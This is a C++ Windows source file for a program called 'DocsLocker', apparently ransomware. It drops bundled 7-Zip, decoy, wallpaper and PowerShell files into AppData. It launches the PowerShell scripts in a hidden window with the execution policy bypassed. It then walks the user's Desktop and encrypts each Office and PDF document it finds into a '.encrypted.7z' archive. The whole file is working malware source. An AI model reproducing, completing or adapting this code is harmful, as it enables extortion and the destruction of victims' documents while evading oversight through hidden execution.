#include <iostream>
#include <string>
#include <fstream>
#include <windows.h>
#include <shlwapi.h>

#include "DocsLocker.h"
#include "addons.h"

#define SEARCH_DESKTOP

using namespace std;

const char *extension_whitelist[] = {
	".doc",".docx",".ppt",".pptx",".xls",".xlsx",".pdf"
};

const char appfolder_name[] = "\\DocsLocker";

char env_appdata_path[MAX_PATH];
char env_profile_path[MAX_PATH];

// install addons and encrypt eligible files in specified path
int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)
{	
	GetEnvironmentVariable("userprofile", env_profile_path, MAX_PATH);
	GetEnvironmentVariable("appdata", env_appdata_path, MAX_PATH);

	extract_addon(addon_sevenzip, sizeof(addon_sevenzip), "7za.exe");
	extract_addon(addon_document, sizeof(addon_document), "document.doc");
	extract_addon(addon_background, sizeof(addon_background), "background.bmp");
	extract_addon(addon_init_script, sizeof(addon_init_script), "init.ps1");
	extract_addon(addon_encrypt_script, sizeof(addon_encrypt_script), "encrypt.ps1");

	string search_path(env_profile_path);

#ifdef SEARCH_DESKTOP
		search_path.append("\\Desktop\\*");
#else
		search_path.append("\\Desktop\\Dokumenty\\*");
#endif

	string hello_param("-executionpolicy bypass -Command \"& '");

	hello_param.append(env_appdata_path);
	hello_param.append("\\DocsLocker\\init.ps1'\"");

	exec_powershell(hello_param);

	while(true) {
		string input_file = find_file(search_path.c_str());
		
		if (input_file.length() == 0)
			return 1;

		string output_file(input_file);
		output_file.append(".encrypted.7z");

		string encrypt_param("-executionpolicy bypass -Command \"& '");

		encrypt_param.append(env_appdata_path);
		encrypt_param.append("\\DocsLocker\\encrypt.ps1' '");
		encrypt_param.append(input_file);
		encrypt_param.append("' '");
		encrypt_param.append(output_file);
		encrypt_param.append("'\"");

		exec_powershell(encrypt_param);

		cout << "ENCRYPTING....: " << input_file << endl;
	}

	return 0;
}

// binary copy an addon to file in the appfolder
void extract_addon(unsigned char addon_data[], int addon_len, const char file_name[])
{
	char addon_path[MAX_PATH];

	strcpy_s(addon_path, env_appdata_path);
	strcat_s(addon_path, appfolder_name);

	CreateDirectory(addon_path, NULL);

	strcat_s(addon_path, "\\");
	strcat_s(addon_path, file_name);

	ofstream output_sevenzip(addon_path, ios::out | ios::binary);
	output_sevenzip.write(reinterpret_cast<char*>(addon_data), addon_len);
	output_sevenzip.close();
}

// execute the powershell with specified parameter
// source: https://stackoverflow.com/questions/17638674/how-to-wait-for-shellexecute-to-run
void exec_powershell(string param)
{	
	SHELLEXECUTEINFO sh_exec_info = { 0 };

	sh_exec_info.lpFile = "powershell.exe";
	sh_exec_info.lpParameters = param.c_str();
	sh_exec_info.nShow = SW_HIDE;

	sh_exec_info.cbSize = sizeof(SHELLEXECUTEINFO);
	sh_exec_info.fMask = SEE_MASK_NOCLOSEPROCESS;
	sh_exec_info.hwnd = NULL;
	sh_exec_info.lpVerb = NULL;	
	sh_exec_info.lpDirectory = NULL;
	sh_exec_info.hInstApp = NULL;

	ShellExecuteEx(&sh_exec_info);
	WaitForSingleObject(sh_exec_info.hProcess, INFINITE);
	CloseHandle(sh_exec_info.hProcess);
}

// return a path of file eligible for encrypting
string find_file(const char path[])
{
	string found_file_path;

	WIN32_FIND_DATA file;
	HANDLE file_handler = INVALID_HANDLE_VALUE;

	file_handler = FindFirstFile(path, &file);

	do {
		// recursive loop protection
		if (strcmp(file.cFileName, ".") == 0
			|| strcmp(file.cFileName, "..") == 0) {
			continue;
		}

		string file_path(path);
		
		// remove asterisk at the end 
		file_path.pop_back();

		file_path.append(file.cFileName);

		// if directory, list recursively
		if (file.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
			file_path.append("\\*");

			found_file_path = find_file(file_path.c_str());
			
			// if file is found, exit loop and start returning
			if(found_file_path.length() > 0)
				break;
		}
		else {
			// check file extension if in whitelist
			char *file_extension = PathFindExtension(file_path.c_str());
			
			for (int i = 0; i < (sizeof(extension_whitelist) / sizeof(extension_whitelist[0])); i++) {
				if (strcmp(file_extension, extension_whitelist[i]) == 0) {
					found_file_path = file_path;

					FindClose(file_handler);
					return found_file_path;
				}
			}
		}
	} while (FindNextFile(file_handler, &file) != 0);

	FindClose(file_handler);
	return found_file_path;
}